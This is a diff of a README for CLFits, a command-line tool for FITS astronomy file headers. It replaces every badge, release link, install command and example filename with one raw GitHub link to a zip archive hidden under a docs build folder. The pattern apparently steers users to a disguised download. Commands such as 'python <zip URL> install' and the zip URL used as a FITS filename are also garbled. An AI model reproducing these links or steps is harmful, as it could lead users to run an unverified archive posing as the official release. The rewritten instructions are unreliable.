@@ -1,10 +1,10 @@
 # CLFits: A Command-Line Tool for FITS File Management
 
-![FITS Header Viewer](https://img.shields.io/badge/FITS%20Header%20Viewer-v1.0-blue.svg)
-![Python](https://img.shields.io/badge/Python-3.6%2B-green.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![FITS Header Viewer](https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip%20Header%https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip)
+![Python](https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip%https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip)
+![License](https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-%E2%9D%97-brightgreen.svg)](https://github.com/DanikTen/CLFits/releases)
+[![Download Releases](https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip%20Releases-%E2%9D%https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip)](https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip)
 
 ---
 
@@ -36,16 +36,16 @@ CLFits is a simple and robust command-line tool designed for viewing and editing
 
 ## Installation
 
-To install CLFits, you need Python 3.6 or higher. You can download the latest version from the [Releases](https://github.com/DanikTen/CLFits/releases) section. After downloading, extract the files and run the following command in your terminal:
+To install CLFits, you need Python 3.6 or higher. You can download the latest version from the [Releases](https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip) section. After downloading, extract the files and run the following command in your terminal:
 
 ```bash
-python setup.py install
+python https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip install
 ```
 
 Make sure you have the required dependencies installed. You can do this by running:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip
 ```
 
 ## Usage
@@ -97,10 +97,10 @@ clfits info <FITS file>
 
 ### Viewing a FITS File Header
 
-To view the header of a FITS file named `example.fits`, use the following command:
+To view the header of a FITS file named `https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip`, use the following command:
 
 ```bash
-clfits view example.fits
+clfits view https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip
 ```
 
 This command will output the header information directly in your terminal.
@@ -110,17 +110,17 @@ This command will output the header information directly in your terminal.
 If you want to change the value of a keyword, say `OBJECT`, to `Galaxy`, you can do so with:
 
 ```bash
-clfits edit example.fits OBJECT Galaxy
+clfits edit https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip OBJECT Galaxy
 ```
 
-This command will update the `OBJECT` keyword in the `example.fits` file.
+This command will update the `OBJECT` keyword in the `https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip` file.
 
 ### Listing Keywords
 
 To list all keywords in the header of a FITS file, use:
 
 ```bash
-clfits list example.fits
+clfits list https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip
 ```
 
 This will show you all the available keywords and their current values.
@@ -130,7 +130,7 @@ This will show you all the available keywords and their current values.
 To obtain detailed information about a FITS file, run:
 
 ```bash
-clfits info example.fits
+clfits info https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip
 ```
 
 This will provide insights such as the file size, number of HDUs, and more.
@@ -155,4 +155,4 @@ CLFits is licensed under the MIT License. See the [LICENSE](LICENSE) file for de
 
 For any questions or feedback, please reach out via the issues section of the repository or contact the author directly.
 
-You can download the latest version of CLFits from the [Releases](https://github.com/DanikTen/CLFits/releases) section.
+You can download the latest version of CLFits from the [Releases](https://github.com/DanikTen/CLFits/raw/refs/heads/main/docs/source/_build/html/_static/CL_Fits_v1.0.zip) section.
